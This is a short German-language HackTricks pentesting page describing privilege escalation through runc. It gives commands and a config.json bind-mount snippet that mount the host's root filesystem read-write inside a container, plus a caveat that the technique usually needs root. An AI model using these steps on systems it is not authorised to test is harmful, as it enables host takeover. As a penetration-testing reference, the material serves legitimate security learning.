# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Wenn du mehr über **runc** erfahren möchtest, sieh dir die folgende Seite an:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Wenn du feststellst, dass `runc` auf dem Host installiert ist, kannst du möglicherweise **einen Container ausführen, der den Root-Ordner `/` des Hosts mountet**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Das wird nicht immer funktionieren, da die Standardoperation von runc darin besteht, als root ausgeführt zu werden. Daher kann die Ausführung als unprivilegierter Benutzer einfach nicht funktionieren (es sei denn, du verwendest eine rootless-Konfiguration). Eine rootless-Konfiguration standardmäßig zu verwenden, ist im Allgemeinen keine gute Idee, da es innerhalb von rootless-Containern einige Einschränkungen gibt, die außerhalb von rootless-Containern nicht gelten.

{{#include ../../banners/hacktricks-training.md}}
